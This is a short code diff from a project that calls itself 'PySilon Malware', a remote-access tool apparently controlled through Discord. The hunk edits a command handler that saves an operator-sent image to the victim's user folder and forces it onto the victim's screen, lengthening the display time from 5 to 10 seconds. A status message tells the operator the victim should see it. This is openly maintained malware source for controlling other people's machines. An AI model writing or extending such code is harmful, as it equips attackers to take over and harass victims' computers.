@@ -46,9 +46,9 @@ elif expectation == 'graphic_file':
         filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
         await message.attachments[0].save(fp=filename)
 
-        screen_manipulator(filename).display_graphic(5)
+        screen_manipulator(filename).display_graphic(10)
 
-        embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 5 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
+        embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
         embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
         await message.channel.send(embed=embed)
 
